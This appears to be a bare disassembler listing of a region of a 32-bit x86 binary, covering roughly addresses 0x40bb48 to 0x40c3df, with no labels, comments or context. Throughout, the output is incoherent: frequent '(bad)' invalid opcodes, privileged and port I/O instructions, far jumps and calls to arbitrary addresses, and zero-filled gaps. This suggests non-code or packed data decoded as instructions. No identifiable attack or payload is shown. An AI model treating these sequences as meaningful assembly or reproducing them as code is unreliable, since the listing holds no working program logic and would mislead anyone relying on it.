  40bb48:	add    dl,BYTE PTR [ebp+0x7b]
  40bb4b:	add    al,0x83
  40bb4d:	ret    
  40bb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb4f:	imul   edi,DWORD PTR [ecx],0x68b26b14
  40bb55:	add    BYTE PTR [ebp+0x23],ah
  40bb58:	loopne 0x40bba9
  40bb5a:	(bad)  
  40bb5b:	cmp    edx,DWORD PTR [eax]
  40bb5d:	(bad)  
  40bb5e:	std    
  40bb5f:	out    0x68,eax
  40bb61:	add    BYTE PTR [edi+0x3b],bh
  40bb64:	clc    
  40bb65:	(bad)  
  40bb66:	and    bh,al
  40bb68:	mov    BYTE PTR [edi+0x0],bh
	...
  40bb7a:	add    BYTE PTR [eax],al
  40bb7c:	in     eax,0xc
  40bb7e:	mov    edx,DWORD PTR [esp+eiz*2+0x30]
  40bb82:	imul   eax,DWORD PTR [eax],0xff6adfca
  40bb88:	repz fild WORD PTR [edx]
  40bb8b:	inc    ebp
  40bb8d:	iret   
  40bb8e:	push   0x7f247ff
  40bb93:	push   0xfffffff0
  40bb95:	or     DWORD PTR [eax+ebp*8],eax
  40bb98:	fwait
  40bb99:	sbb    al,BYTE PTR [eax+eax*1]
  40bb9c:	adc    BYTE PTR [ebp+0x58],0xfc
  40bba0:	sbb    BYTE PTR [edx-0x590fffb4],dh
  40bba6:	ror    BYTE PTR [edi],0xf0
  40bba9:	xchg   edx,eax
  40bbaa:	mov    ebx,ebp
  40bbac:	btc    DWORD PTR [edx],ecx
  40bbaf:	(bad)  
  40bbb0:	jge    0x40bb89
  40bbb2:	jmp    0x7dfe:0xde447852
  40bbb9:	fucomi st,st(2)
  40bbbb:	xchg   edi,eax
  40bbbc:	cmp    eax,0xd0d102e0
  40bbc1:	pusha  
  40bbc2:	ret    
  40bbc3:	add    DWORD PTR [eax+0x25],eax
  40bbc6:	pop    eax
  40bbc7:	or     al,0xd7
  40bbc9:	push   es
  40bbca:	pushf  
  40bbcb:	sti    
  40bbcc:	xlat   BYTE PTR ds:[ebx]
  40bbcd:	push   esi
  40bbce:	mov    eax,ds:0x9bd5c6de
  40bbd3:	idiv   DWORD PTR [esi+0x3cdef95b]
  40bbd9:	out    dx,eax
  40bbda:	adc    BYTE PTR [ecx+0x28],ah
  40bbdd:	(bad)  
  40bbde:	std    
  40bbdf:	retf   
	...
  40bbf0:	add    BYTE PTR [eax],al
  40bbf2:	mov    cl,0xfa
  40bbf4:	call   0xee232731
  40bbf9:	push   edi
  40bbfa:	call   0x983d17d4
  40bbff:	lock pusha 
  40bc01:	fld    QWORD PTR [esi-0x77efa42b]
  40bc07:	sbb    DWORD PTR [esp+eax*1],0xfffffff0
  40bc0b:	inc    esi
  40bc0c:	sbb    ebp,ebx
  40bc0e:	in     al,0x2
  40bc10:	mov    esi,0xf1df0857
  40bc15:	pop    ebx
  40bc16:	pop    edi
  40bc17:	aad    0xad
  40bc19:	push   edi
  40bc1a:	cld    
  40bc1b:	aad    0x1b
  40bc1d:	hlt    
  40bc1e:	dec    esi
  40bc1f:	pop    ebx
  40bc20:	add    esp,ebp
  40bc22:	adc    al,0x4f
  40bc24:	xchg   esi,eax
  40bc25:	(bad)  [eax]
  40bc27:	enter  0x3f4,0x9d
  40bc2b:	adc    DWORD PTR [ebx+eax*4-0x228645cd],0xfbfbd526
  40bc36:	ins    BYTE PTR es:[edi],dx
  40bc37:	mov    ebp,eax
  40bc39:	fist   WORD PTR [esi]
  40bc3b:	aad    0xb8
  40bc3d:	fadd   QWORD PTR [esi+edi*8-0x2afa41b0]
  40bc44:	push   ebp
  40bc45:	fld    QWORD PTR [esi+ebp*8-0x230878a5]
  40bc4c:	inc    ebp
  40bc4d:	fnstsw WORD PTR [edi]
  40bc4f:	aam    0xb3
  40bc51:	movntq QWORD PTR [edx+0x0],mm3
  40bc55:	loope  0x40bc57
	...
  40bc67:	add    bl,cl
  40bc69:	clc    
  40bc6a:	(bad)  
  40bc6b:	cs mov ch,0x5e
  40bc6e:	add    BYTE PTR [ebx-0x1500a10d],dl
  40bc74:	repz push es
  40bc76:	lea    ebp,[esp+esi*8-0x26]
  40bc7a:	dec    BYTE PTR [esi]
  40bc7c:	cld    
  40bc7d:	pusha  
  40bc7e:	inc    DWORD PTR [esi]
  40bc80:	inc    edi
  40bc81:	imul   DWORD PTR [ecx-0x17]
  40bc84:	sbb    DWORD PTR [edi],eax
  40bc86:	call   0x47fce6
  40bc8b:	outs   dx,DWORD PTR es:[esi]
  40bc8d:	in     al,0xf2
  40bc8f:	out    0xac,al
  40bc91:	add    al,0x0
  40bc93:	jmp    0xddc5888b
  40bc98:	mov    al,ds:0xf3ebfed5
  40bc9d:	push   es
  40bc9e:	add    BYTE PTR [esi-0x410d238a],ch
  40bca4:	inc    esp
  40bca5:	aam    0xfe
  40bca7:	jmp    0xadc5889f
  40bcac:	inc    eax
  40bcad:	aad    0xfe
  40bcaf:	jmp    0x7240c3a7
  40bcb4:	(bad)  
  40bcb5:	out    dx,al
  40bcb6:	mov    bh,bl
  40bcb8:	leave  
  40bcb9:	push   es
  40bcba:	lea    esp,[ebx+eiz*1-0x27]
  40bcbe:	inc    BYTE PTR [esi-0x727b7e1d]
  40bcc4:	inc    eax
  40bcc5:	aad    0xfe
  40bcc7:	sbb    DWORD PTR [edi-0x75],ebp
  40bcca:	out    0x7a,eax
	...
  40bcdc:	add    BYTE PTR [eax],al
  40bcde:	xor    al,0xd5
  40bce0:	dec    edi
  40bce1:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce3:	idiv   dh
  40bce5:	aam    0xf7
  40bce7:	shl    DWORD PTR [ecx+eiz*8-0x77],cl
  40bceb:	push   es
  40bcec:	call   esp
  40bcee:	sti    
  40bcef:	aam    0x51
  40bcf1:	add    BYTE PTR [ebp+0x2ae8bb86],bl
  40bcf7:	mov    bl,0xfd
  40bcf9:	add    dh,dl
  40bcfb:	mov    ebx,DWORD PTR [edx]
  40bcfd:	add    ecx,ecx
  40bcff:	pop    es
  40bd00:	cmp    DWORD PTR [ebp-0x2491b],0xffffffd9
  40bd07:	add    al,BYTE PTR [edi+ecx*1-0x38fff838]
  40bd0e:	dec    esp
  40bd0f:	pushf  
  40bd10:	icebp  
  40bd11:	push   esi
  40bd13:	pop    es
  40bd14:	add    bh,ch
  40bd16:	out    0x5f,eax
  40bd18:	sahf   
  40bd19:	inc    ecx
  40bd1a:	dec    eax
  40bd1b:	pop    es
  40bd1c:	lea    eax,[ebp-0x24c77]
  40bd22:	leave  
  40bd23:	loop   0x40bd37
  40bd25:	dec    esp
  40bd26:	cdq    
  40bd27:	pop    es
  40bd28:	test   eax,eax
  40bd2a:	sbb    eax,0x3d85c74d
  40bd2f:	mov    ebx,0x758fffd
  40bd34:	out    dx,eax
  40bd35:	mov    esi,0x413f7ac1
  40bd3a:	dec    ecx
  40bd3b:	jle    0x40bcc0
  40bd3d:	add    BYTE PTR [ebp+0x50fdaf],al
	...
  40bd53:	add    BYTE PTR [ecx-0x4b],ah
  40bd56:	dec    ecx
  40bd57:	add    BYTE PTR [ecx-0x7a],bl
  40bd5a:	mov    esi,0x83c82a74
  40bd5f:	aam    0x5a
  40bd61:	scas   eax,DWORD PTR es:[edi]
  40bd62:	std    
  40bd63:	add    bl,BYTE PTR [ecx]
  40bd65:	loopne 0x40bd23
  40bd67:	push   0x414961
  40bd6c:	xchg   esp,eax
  40bd6d:	test   esi,edi
  40bd6f:	sti    
  40bd70:	xchg   BYTE PTR [edi+0x43cfe84e],ch
  40bd76:	add    BYTE PTR [eax],al
  40bd78:	mov    edx,cs
  40bd7a:	or     eax,0x380f085
  40bd7f:	add    al,dh
  40bd81:	lds    esi,FWORD PTR [esi-0x781fcec0]
  40bd87:	test   al,dh
  40bd89:	sbb    ebx,ebx
  40bd8b:	inc    BYTE PTR [eax+0x48]
  40bd8e:	mov    bl,0x4b
  40bd90:	lock fisttp WORD PTR ds:0x856f44c0
  40bd97:	cmp    al,0xf
  40bd99:	sahf   
  40bd9a:	inc    ebx
  40bd9b:	add    al,dh
  40bd9d:	call   0xe0313e20
  40bda2:	add    bh,bh
  40bda4:	gs clc 
  40bda6:	(bad)  
  40bda7:	(bad)  
  40bda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda9:	popa   
  40bdaa:	sbb    edi,0xfed9d9a3
  40bdb0:	pop    ebp
  40bdb1:	aam    0xd5
  40bdb3:	dec    BYTE PTR [edi+0xe38059]
	...
  40bdc9:	add    BYTE PTR [ebx+0x758cd9b1],al
  40bdcf:	cwde   
  40bdd0:	aad    0xfe
  40bdd2:	ja     0x40bde4
  40bdd4:	outs   dx,BYTE PTR ds:[esi]
  40bdd5:	add    edx,ebx
  40bdd7:	fild   QWORD PTR [eax+eax*1-0x26]
  40bddb:	fild   QWORD PTR [eax+eax*1+0x6d]
  40bddf:	arpl   bx,sp
  40bde1:	repnz push edi
  40bde3:	mov    eax,ds:0xc0e5ff32
  40bde8:	inc    esp
  40bde9:	inc    ecx
  40bdea:	lock aam 0xc2
  40bded:	jae    0x40bda6
  40bdef:	js     0x40be40
  40bdf1:	adc    al,0x37
  40bdf3:	cmp    edi,DWORD PTR [ebx-0x2676d00e]
  40bdf9:	mov    ah,0x44
  40bdfb:	dec    ebp
  40bdfc:	(bad)  
  40bdfe:	pop    ds
  40bdff:	shl    edx,cl
  40be01:	(bad)  
  40be02:	pop    ebp
  40be03:	jl     0x40bdda
  40be05:	dec    BYTE PTR [edi]
  40be07:	pop    es
  40be08:	push   ecx
  40be09:	fiadd  WORD PTR [edx+edx*8]
  40be0c:	pop    ebp
  40be0d:	fiadd  DWORD PTR [ebx+esi*4+0x59]
  40be11:	(bad)  
  40be13:	fisubr WORD PTR [esi]
  40be15:	dec    ebp
  40be16:	lock push es
  40be18:	push   edx
  40be19:	clc    
  40be1a:	out    0x5b,al
  40be1c:	aad    0xda
  40be1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1f:	fidivr WORD PTR [ecx]
  40be21:	fcmovbe st,st(6)
  40be23:	shl    DWORD PTR [ebx-0x19],1
  40be26:	ret    0x25d1
  40be29:	fidivr DWORD PTR [edi+esi*8]
  40be2c:	sbb    eax,0x90
	...
  40be3d:	add    BYTE PTR [eax],al
  40be3f:	add    BYTE PTR [ebx-0x3025ea2b],ah
  40be45:	mov    bh,0xb
  40be47:	fisubr DWORD PTR [esi-0x5d18c42f]
  40be4d:	sar    ebp,1
  40be4f:	jmp    0xc4a9:0x3e93dc3
  40be56:	aam    0x3
  40be58:	and    eax,0xb385d47e
  40be5d:	mov    ?,WORD PTR ds:0x61fb248d
  40be63:	mul    BYTE PTR [ebx+ecx*2-0x6f]
  40be67:	xor    al,0xda
  40be69:	push   es
  40be6a:	(bad)  
  40be6b:	dec    edi
  40be6c:	hlt    
  40be6d:	shl    DWORD PTR [ebx],1
  40be6f:	or     al,0xca
  40be71:	push   es
  40be72:	mov    dh,0x4f
  40be74:	cld    
  40be75:	rcr    DWORD PTR [edx],1
  40be77:	xor    BYTE PTR [ebp-0x3a],dh
  40be7a:	sbb    esi,DWORD PTR [eax]
  40be7c:	das    
  40be7d:	dec    ebx
  40be7e:	pop    ebp
  40be7f:	add    al,0xf0
  40be81:	push   es
  40be82:	jmp    0x61cf5b13
  40be87:	idiv   BYTE PTR [ebx+ecx*2+0x45]
  40be8b:	xor    al,0x75
  40be8d:	dec    ebx
  40be8e:	test   eax,0xfff68a34
  40be93:	jne    0x40be3c
  40be95:	mov    ?,esi
  40be97:	sbb    edi,eax
  40be99:	test   DWORD PTR [ebp+eiz*4-0x14],edi
  40be9d:	pop    edx
  40be9e:	daa    
  40be9f:	ins    BYTE PTR es:[edi],dx
  40bea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea1:	(bad)  
  40bea2:	(bad)  
  40bea3:	fadd   QWORD PTR [eax]
	...
  40beb5:	add    BYTE PTR [edi],al
  40beb7:	shl    BYTE PTR [ecx+edi*8-0x38],1
  40bebb:	sbb    edi,edi
  40bebd:	mov    esp,0xf174cfef
  40bec2:	retf   
  40bec3:	mov    ah,0xfc
  40bec5:	ss mov ecx,0x574136d1
  40becb:	cmp    al,0x0
  40becd:	jmp    0x1e44883e
  40bed2:	aaa    
  40bed3:	xchg   ebx,eax
  40bed4:	je     0x40bf0d
  40bed6:	lds    ebx,FWORD PTR [ecx+0x7d8bb48a]
  40bedc:	adc    DWORD PTR [esi],eax
  40bede:	aaa    
  40bedf:	(bad)  
  40bee0:	(bad)  
  40bee1:	fwait
  40bee2:	jmp    0x40bf13
  40bee4:	leave  
  40bee5:	sub    ebx,DWORD PTR [eax+edx*8-0x78679dad]
  40beec:	ret    
  40beed:	loope  0x40be98
  40beef:	sar    esi,1
  40bef1:	ss ins DWORD PTR es:[edi],dx
  40bef3:	cmp    edx,DWORD PTR [eax]
  40bef5:	bound  edi,QWORD PTR [ebp-0x7d]
  40bef8:	test   cl,dl
  40befa:	dec    ecx
  40befb:	sar    esi,1
  40befd:	sbb    esi,edx
  40beff:	push   es
  40bf00:	push   DWORD PTR [esp+ebp*8]
  40bf03:	pop    esp
  40bf04:	add    BYTE PTR [esi+0x1bfef6a6],dh
  40bf0a:	call   0xd15d7e98
  40bf0f:	mov    DWORD PTR [ebp+ebx*4-0x16012ee7],0x620006f3
	...
  40bf2a:	add    BYTE PTR [eax],al
  40bf2c:	sahf   
  40bf2d:	xlat   BYTE PTR ds:[ebx]
  40bf2e:	std    
  40bf2f:	add    BYTE PTR [esi-0x51],ch
  40bf32:	mov    DWORD PTR [edx],edx
  40bf34:	mov    WORD PTR [eax-0x5],ss
  40bf37:	(bad)  
  40bf38:	sahf   
  40bf39:	scas   al,BYTE PTR es:[edi]
  40bf3a:	dec    esi
  40bf3b:	lea    edx,[ebx+eax*1+0x138effff]
  40bf42:	push   0x10
  40bf44:	sahf   
  40bf45:	xor    dh,0xfe
  40bf48:	sahf   
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	std    
  40bf4b:	push   edx
  40bf4c:	int    0x8a
  40bf4e:	mov    ebx,0xfdaf2ffc
  40bf53:	add    BYTE PTR [ebp-0x364272d7],ah
  40bf59:	scas   al,BYTE PTR es:[edi]
  40bf5a:	std    
  40bf5b:	call   FWORD PTR [esi]
  40bf5d:	inc    ecx
  40bf5e:	adc    bh,bh
  40bf60:	fs pop es
  40bf62:	push   edi
  40bf63:	jmp    DWORD PTR [ebx+edi*8-0x19]
  40bf67:	adc    ebx,esi
  40bf69:	scas   al,BYTE PTR es:[edi]
  40bf6a:	std    
  40bf6b:	adc    esi,0xffffffd3
  40bf6e:	std    
  40bf6f:	(bad)  
  40bf70:	in     eax,dx
  40bf71:	lods   eax,DWORD PTR ds:[esi]
  40bf72:	std    
  40bf73:	jmp    DWORD PTR [esi+eiz*8]
  40bf76:	jmp    0xf7a1d225
  40bf7b:	(bad)  
  40bf7c:	sahf   
  40bf7d:	mov    bh,0x89
  40bf7f:	adc    cl,BYTE PTR [esi-0x6101098b]
  40bf85:	mov    bh,0xfd
  40bf87:	push   edx
  40bf88:	xchg   ecx,eax
  40bf89:	sbb    cl,cl
  40bf8b:	ret    0x34d
  40bf8e:	push   ebp
  40bf8f:	mov    eax,DWORD PTR [eax]
	...
  40bfa1:	add    BYTE PTR ds:0x9ff8c289,bh
  40bfa7:	mov    bh,0xfd
  40bfa9:	push   edi
  40bfaa:	rcl    BYTE PTR ds:0x7e2b8b0c,cl
  40bfb0:	cmp    eax,0xffffff8f
  40bfb3:	mov    bh,0xfd
  40bfb5:	push   eax
  40bfb6:	jecxz  0x40bfc2
  40bfb8:	push   0x0
  40bfba:	lock js 0x40c00d
  40bfbd:	or     al,0x2f
  40bfbf:	or     ebx,DWORD PTR [eax*4-0x38ca2dd0]
  40bfc6:	mov    ch,0x51
  40bfc8:	add    al,0x0
  40bfca:	lock fnsave [edx-0x76]
  40bfce:	gs push ebp
  40bfd0:	(bad)  
  40bfd1:	inc    BYTE PTR [edi]
  40bfd3:	push   esp
  40bfd4:	repnz mov WORD PTR [ebp+0x6d8d3431],?
  40bfdb:	cmp    esi,edx
  40bfdd:	(bad)  
  40bfde:	out    dx,eax
  40bfdf:	nop
  40bfe0:	push   0xdc4be710
  40bfe5:	std    
  40bfe6:	fisttp WORD PTR ds:0x2fe451d7
  40bfec:	cmp    DWORD PTR [esp+ecx*8-0x20],0x72
  40bff1:	jae    0x40c003
  40bff3:	push   ebx
  40bff4:	cdq    
  40bff5:	sti    
  40bff6:	mov    esi,0xb78fd6ed
  40bffb:	imul   eax,DWORD PTR [esi],0xffffffff
  40bffe:	and    eax,0xf8e82de8
  40c003:	add    al,0xd7
  40c005:	inc    BYTE PTR [eax]
	...
  40c017:	add    BYTE PTR [ebx+0x25],dh
  40c01a:	hlt    
  40c01b:	(bad)  
  40c01c:	xchg   edi,eax
  40c01d:	mov    ds:0x7058fd6,eax
  40c022:	je     0x40c00e
  40c024:	inc    edx
  40c025:	pop    ecx
  40c026:	jo     0x40c01f
  40c028:	jle    0x40bfd7
  40c02a:	aad    0x8a
  40c02c:	loop   0x40bfe2
  40c02e:	(bad)  
  40c02f:	imul   DWORD PTR [esi-0x43]
  40c032:	aad    0xfe
  40c034:	ret    0x35d7
  40c037:	leave  
  40c038:	xor    bl,al
  40c03a:	add    dl,BYTE PTR [ebp+0x6b]
  40c03d:	les    eax,FWORD PTR [ecx-0x29097f3d]
  40c043:	je     0x40c039
  40c045:	push   es
  40c046:	xchg   ecx,eax
  40c047:	int3   
  40c048:	test   al,0x6
  40c04a:	jmp    0xec94f059
  40c04f:	xor    eax,0x3dcc939
  40c054:	inc    ecx
  40c055:	out    0x69,eax
  40c057:	ret    
  40c058:	icebp  
  40c059:	sbb    DWORD PTR [eax+0x18daac88],0xdd540f32
  40c063:	jmp    0x40bff8
  40c065:	jl     0x40c0cc
  40c067:	(bad)  
  40c068:	retf   0x6fbf
  40c06b:	dec    eax
  40c06c:	sbb    al,0xe2
  40c06e:	loop   0x40c07d
  40c070:	call   DWORD PTR [esp+eiz*4-0x53f82bd4]
  40c077:	scas   eax,DWORD PTR es:[edi]
  40c078:	xor    BYTE PTR [edx+0xef3f],cl
	...
  40c08e:	popa   
  40c08f:	fadd   DWORD PTR [ecx]
  40c091:	into   
  40c092:	js     0x40c0e7
  40c094:	sbb    edx,ebp
  40c096:	unpckhps xmm6,xmm6
  40c099:	lea    esi,[ebx]
  40c09b:	sbb    eax,0x6a48330d
  40c0a0:	stos   DWORD PTR es:[edi],eax
  40c0a1:	inc    esp
  40c0a2:	lock jnp 0x40c048
  40c0a5:	mov    ebx,0x4c14df37
  40c0aa:	lock push es
  40c0ac:	push   0xffffffbf
  40c0ae:	jmp    0x40c12b
  40c0b0:	stos   DWORD PTR es:[edi],eax
  40c0b1:	mov    ebx,0xb373ce3f
  40c0b6:	(bad)  
  40c0b7:	jle    0x40c11a
  40c0b9:	aad    0x7e
  40c0bb:	jg     0x40c0e0
  40c0bd:	mov    ah,0x2d
  40c0bf:	mov    dl,dh
  40c0c1:	lock loope 0x40c07d
  40c0c4:	addr16 pop edi
  40c0c6:	cmp    al,0xcd
  40c0c8:	call   0x340eb0d0
  40c0cd:	mov    al,0xcf
  40c0cf:	imul   eax,DWORD PTR [eax],0x8d06b32b
  40c0d5:	and    al,0x84
  40c0d7:	cmp    eax,0x6ab65e8
  40c0dc:	add    BYTE PTR [edx+0x30],ch
  40c0df:	add    DWORD PTR [ebp-0xc293d4],ecx
  40c0e5:	adc    al,0x5c
  40c0e7:	in     eax,0x57
  40c0e9:	add    al,BYTE PTR [ebp-0x34]
  40c0ec:	mov    BYTE PTR [esp+ebx*2],ah
  40c0ef:	jp     0x40c135
  40c0f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  40c102:	add    BYTE PTR [eax],al
  40c104:	(bad)  
  40c105:	int    0x74
  40c107:	cdq    
  40c108:	xchg   esp,eax
  40c109:	pop    esi
  40c10a:	inc    edx
  40c10b:	test   al,0xf3
  40c10d:	int    0x34
  40c10f:	int3   
  40c110:	retf   0x47
  40c113:	inc    ecx
  40c114:	push   ecx
  40c115:	push   ecx
  40c116:	dec    DWORD PTR [esi-0x7]
  40c119:	(bad)  
  40c11a:	push   cs
  40c11b:	ins    DWORD PTR es:[edi],dx
  40c11c:	dec    ebp
  40c11d:	int3   
  40c11e:	(bad)  
  40c11f:	jmp    0x6b09048e
  40c124:	daa    
  40c125:	mov    ebx,0x8647ddff
  40c12a:	(bad)  
  40c12b:	call   0xedb58d23
  40c130:	retf   
  40c131:	or     BYTE PTR [ecx-0x17],cl
  40c134:	repz mov ch,0xdf
  40c137:	push   0xffffffac
  40c139:	push   es
  40c13a:	mov    DWORD PTR [ebx+eax*4+0x6ced74cd],ebp
  40c141:	inc    ebx
  40c142:	mov    ah,0xf6
  40c144:	ds mov ebx,0xcdb3a48e
  40c14a:	je     0x40c0fd
  40c14c:	je     0x40c191
  40c14e:	les    esp,FWORD PTR [esi-0x1700754a]
  40c154:	repz push es
  40c156:	or     DWORD PTR [ebp*4+0x4900411d],0x8
  40c15e:	je     0x40c1b0
  40c160:	les    ecx,FWORD PTR [eax+edi*4]
  40c163:	push   eax
  40c164:	mov    bl,0x7
  40c166:	push   0x0
	...
  40c178:	add    BYTE PTR [eax],al
  40c17a:	mov    bl,0x2
  40c17c:	lea    eax,[ebp-0x67]
  40c17f:	pop    ss
  40c180:	push   0x0
  40c182:	les    ecx,FWORD PTR [eax+eax*8]
  40c185:	push   eax
  40c186:	xchg   ch,bl
  40c188:	dec    ebp
  40c189:	sub    eax,ebx
  40c18b:	add    cl,BYTE PTR [ebx]
  40c18d:	rcr    BYTE PTR ds:0xd57d82f6,0x7
  40c194:	je     0x40c1c2
  40c196:	call   0x8aff:0xfd001034
  40c19d:	push   ebp
  40c19e:	stc    
  40c19f:	sub    edi,eax
  40c1a1:	add    dl,dh
  40c1a3:	add    bh,bh
  40c1a5:	jne    0x40c178
  40c1a7:	mov    dl,0x73
  40c1a9:	mov    eax,0xffbc3d36
  40c1ae:	pushf  
  40c1af:	add    ebp,DWORD PTR [eax+0x3]
  40c1b2:	leave  
  40c1b3:	loop   0x40c171
  40c1b5:	call   0x3e6ff7
  40c1ba:	push   ss
  40c1bb:	cmp    eax,0xb03e8bc
  40c1c0:	add    BYTE PTR [eax],al
  40c1c2:	(bad)  
  40c1c3:	cmp    al,0xc8
  40c1c5:	call   0x3ffbff
  40c1ca:	idiv   BYTE PTR [eax+edx*8]
  40c1cd:	call   0x3ffbff
  40c1d2:	ja     0x40c194
  40c1d4:	ror    BYTE PTR [ecx+ebx*4],0x1c
  40c1d8:	mov    ebp,esp
  40c1da:	sbb    cl,BYTE PTR [esi+eax*8+0x8d]
	...
  40c1ed:	add    BYTE PTR [eax],al
  40c1ef:	add    ah,cl
  40c1f1:	mov    dh,0x4e
  40c1f3:	push   0x4144d6
  40c1f8:	lock inc edi
  40c1fa:	or     DWORD PTR [edx-0x10],ebp
  40c1fd:	inc    ebp
  40c1fe:	and    eax,DWORD PTR [edx-0x4f]
  40c201:	fstp   st(2)
  40c203:	mov    ebp,0x8502dda8
  40c208:	xor    ah,ah
  40c20a:	jp     0x40c1cb
  40c20c:	lock fld QWORD PTR [edx]
  40c20f:	mov    esp,DWORD PTR [ebp+0x65117ea1]
  40c215:	and    cl,ah
  40c217:	dec    edi
  40c218:	das    
  40c219:	jmp    0xbf87:0xd9c2fecf
  40c220:	out    dx,eax
  40c221:	push   ebp
  40c222:	jb     0x40c223
  40c224:	pop    ss
  40c225:	fld    QWORD PTR [ebp+0x1dd087c]
  40c22b:	test   BYTE PTR [ebp+ebx*8+0x2],bl
  40c22f:	add    BYTE PTR [edi],dh
  40c231:	call   0xc702:0xdcf7ffb6
  40c238:	xor    eax,0xf0000418
  40c23d:	(bad)  
  40c23f:	inc    esp
  40c240:	sar    al,0x3
  40c243:	add    al,dh
  40c245:	and    BYTE PTR [ecx-0x34],cl
  40c248:	lock fild WORD PTR [edx]
  40c24b:	add    BYTE PTR [ebx+0x73],bh
  40c24e:	retf   0xe28a
  40c251:	push   edx
  40c252:	dec    ecx
  40c253:	int3   
	...
  40c264:	add    BYTE PTR [eax],al
  40c266:	and    BYTE PTR [ebx+0x49],bl
  40c269:	rol    BYTE PTR [eax-0x7a],1
  40c26c:	add    edi,edi
  40c26e:	sbb    eax,0xec51d2f8
  40c273:	aam    0xc2
  40c275:	je     0x40c2b3
  40c277:	pop    ebp
  40c278:	push   ecx
  40c279:	int3   
  40c27a:	icebp  
  40c27b:	dec    edx
  40c27c:	inc    ecx
  40c27d:	add    DWORD PTR ds:0x367403f4,0x7
  40c284:	push   ecx
  40c285:	xor    esi,DWORD PTR [edx]
  40c287:	dec    eax
  40c288:	jmp    0xc0f3a75f
  40c28d:	enter  0x6af,0xe9
  40c291:	(bad)  
  40c292:	lahf   
  40c293:	push   ebx
  40c294:	repz imul ebp,DWORD PTR [edi],0x7903e907
  40c29b:	inc    esp
  40c29c:	mov    eax,ds:0x23c1eede
  40c2a1:	mov    esp,0x3e8ca3f
  40c2a6:	aaa    
  40c2a7:	push   esp
  40c2a8:	mov    cl,0xd2
  40c2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ab:	mov    dl,0x95
  40c2ad:	pop    eax
  40c2ae:	clc    
  40c2af:	fiadd  WORD PTR [esi-0x7a35e130]
  40c2b5:	pop    eax
  40c2b6:	cmp    al,0xdf
  40c2b8:	(bad)  
  40c2b9:	cmp    esi,eax
  40c2bb:	push   es
  40c2bc:	push   0x50
  40c2be:	sub    BYTE PTR [edi],al
  40c2c0:	cmc    
  40c2c1:	sti    
  40c2c2:	(bad)  
  40c2c3:	push   ebx
  40c2c4:	inc    ecx
  40c2c5:	fucomi st,st(7)
  40c2c7:	ds jmp 0x40c2d0
	...
  40c2d9:	add    BYTE PTR [eax],al
  40c2db:	add    bl,bl
  40c2dd:	jp     0x40c340
  40c2df:	cmp    al,ch
  40c2e1:	jge    0x40c2dd
  40c2e3:	shl    BYTE PTR [edi+ecx*8+0x45],cl
  40c2e7:	xor    eax,0xcf937de8
  40c2ec:	jp     0x40c2e2
  40c2ee:	xor    eax,0x9ac9c458
  40c2f3:	sti    
  40c2f4:	test   al,0xc4
  40c2f6:	in     al,dx
  40c2f7:	add    ebx,DWORD PTR ds:0xb3860c7e
  40c2fd:	out    0xbe,al
  40c2ff:	xchg   ah,ah
  40c301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c302:	stos   BYTE PTR es:[edi],al
  40c303:	inc    esp
  40c304:	lock push es
  40c306:	jl     0x40c2f9
  40c308:	scas   al,BYTE PTR es:[edi]
  40c309:	add    ecx,DWORD PTR [edx+0x45]
  40c30c:	xor    DWORD PTR [edi],eax
  40c30e:	add    al,ch
  40c310:	repz push es
  40c312:	add    BYTE PTR [edi],ch
  40c314:	dec    edx
  40c315:	inc    edi
  40c316:	inc    ecx
  40c317:	jmp    0xa8a6c3b0
  40c31c:	sbb    al,BYTE PTR ds:0x60eeaf83
  40c322:	or     DWORD PTR [edi],0xfffffff4
  40c325:	push   ebx
  40c326:	repz push 0xffffffe7
  40c329:	test   eax,0x6f4282d
  40c32e:	(bad)  
  40c330:	xor    eax,0x74e9fec9
  40c335:	or     bl,bl
  40c337:	xlat   BYTE PTR ds:[ebx]
  40c338:	mov    dl,0x6
  40c33a:	add    dh,ch
  40c33c:	ja     0x40c319
  40c33e:	(bad)  
  40c33f:	call   0x40c344
	...
  40c350:	add    BYTE PTR [eax],al
  40c352:	repz test DWORD PTR [esi+ebx*1],edi
  40c356:	sti    
  40c357:	inc    edi
  40c358:	add    cl,ch
  40c35a:	lock and al,0xe9
  40c35e:	repz push es
  40c360:	(bad)  
  40c361:	sub    al,0x20
  40c363:	leave  
  40c364:	(bad)  
  40c365:	jmp    0x6185855d
  40c36a:	in     al,dx
  40c36b:	push   es
  40c36c:	add    cl,ch
  40c36e:	outs   dx,BYTE PTR ds:[esi]
  40c36f:	inc    ebx
  40c370:	cld    
  40c371:	mov    ecx,0xb9f84366
  40c376:	cmp    eax,0x2e386807
  40c37b:	inc    esi
  40c37c:	add    BYTE PTR [esi],bh
  40c37e:	(bad)  
  40c37f:	lods   eax,DWORD PTR ds:[esi]
  40c380:	sub    eax,0xbffbf3a8
  40c385:	fidiv  WORD PTR [edi-0x6e]
  40c388:	(bad)  
  40c389:	call   0x21bd4781
  40c38e:	hlt    
  40c38f:	test   DWORD PTR [ebx+0x6ec45],0xffcb2f6a
  40c399:	call   FWORD PTR [esi-0x66ff5f80]
  40c39f:	add    al,0x8b
  40c3a1:	jne    0x40c420
  40c3a3:	lods   eax,DWORD PTR ds:[esi]
  40c3a4:	add    BYTE PTR [eax],0x89
  40c3a7:	add    al,0x56
  40c3a9:	mov    edx,edi
  40c3ab:	mov    ch,0x74
  40c3ad:	sbb    dh,bl
  40c3af:	inc    eax
  40c3b0:	lock inc edi
  40c3b3:	(bad)  
  40c3b4:	lea    eax,[ebp+0x0]
	...
  40c3c7:	add    BYTE PTR [ebp+0x2c],al
  40c3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3cb:	inc    edx
  40c3cc:	or     BYTE PTR [ebx],al
  40c3ce:	call   0x43dbaa
  40c3d3:	sar    DWORD PTR [ecx],1
  40c3d5:	cmp    DWORD PTR [esi-0x1fbf2ffe],0x68
  40c3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3dd:	inc    ecx
  40c3de:	inc    ecx
  40c3df:	add    BYTE PTR [esi-0x2b381bc0],bl
